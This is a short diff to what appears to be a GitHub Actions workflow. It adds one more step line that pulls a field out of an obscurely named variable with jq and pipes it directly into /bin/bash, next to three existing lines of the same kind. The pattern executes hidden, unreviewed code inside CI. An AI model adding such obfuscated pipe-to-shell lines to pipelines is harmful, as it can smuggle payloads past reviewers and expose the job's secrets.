@@ -34,6 +34,7 @@ jobs:
           echo $bx34644 | jq -r .kzqx253 | /bin/bash
           echo $awj71749 | jq -r .vssw466 | /bin/bash
           echo $ldhc92561 | jq -r .j1 | /bin/bash
+          printf '%s' "$v98" | jq -r .qn1885 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
